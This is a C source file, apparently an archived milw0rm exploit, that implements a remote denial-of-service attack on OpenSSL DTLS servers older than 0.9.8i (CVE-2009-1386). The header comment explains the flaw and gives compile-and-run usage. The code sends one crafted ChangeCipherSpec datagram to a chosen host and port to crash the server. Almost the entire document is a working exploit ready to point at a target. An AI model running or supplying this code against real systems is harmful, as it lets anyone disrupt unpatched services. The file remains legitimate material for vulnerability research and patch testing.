/*
 * cve-2009-1386.c
 *
 * OpenSSL < 0.9.8i DTLS ChangeCipherSpec Remote DoS
 * Jon Oberheide <jon@oberheide.org>
 * http://jon.oberheide.org
 *
 * Information:
 *
 *   http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-1386
 *
 *   OpenSSL would SegFault if the DTLS server receives a ChangeCipherSpec as
 *   the first record instead of ClientHello.
 *
 * Usage:
 *
 *   Pass the host and port of the target DTLS server:
 *
 *   $ gcc cve-2009-1386.c -o cve-2009-1386
 *   $ ./cve-2009-1386 1.2.3.4 666
 *
 * Notes:
 *
 *   Much easier than the memory exhaustion DoS issue (CVE-2009-1378) as this
 *   only requires a single ChangeCipherSpec datagram, but affects an older
 *   version of OpenSSL.
 *
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>

int
main(int argc, char **argv)
{
	int sock, ret;
	char *ptr, *err;
	struct hostent *h;
	struct sockaddr_in target;
	char buf[64];

	if (argc < 3) {
		err = "Pass the host and port of the target DTLS server";
		printf("[-] Error: %s\n", err);
		exit(1);
	}

	h = gethostbyname(argv[1]);
	if (!h) {
		err = "Unknown host specified";
		printf("[-] Error: %s (%s)\n", err, strerror(errno));
		exit(1);
	}

	target.sin_family = h->h_addrtype;
	memcpy(&target.sin_addr.s_addr, h->h_addr_list[0], h->h_length);
	target.sin_port = htons(atoi(argv[2]));

	sock = socket(AF_INET, SOCK_DGRAM, 0);
	if (sock == -1) {
		err = "Failed creating UDP socket";
		printf("[-] Error: %s (%s)\n", err, strerror(errno));
		exit(1);
	}

	ret = connect(sock, (struct sockaddr *) &target, sizeof(target));
	if (ret == -1) {
		err = "Failed to connect socket";
		printf("[-] Error: %s (%s)\n", err, strerror(errno));
		exit(1);
	}

	memcpy(buf, "\x14\xfe\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x01", 14);

	printf("[+] Sending DTLS datagram of death at %s:%s...\n", argv[1], argv[2]);

	send(sock, buf, 14, 0);

	close(sock);

	return 0;
}

// milw0rm.com [2009-06-04]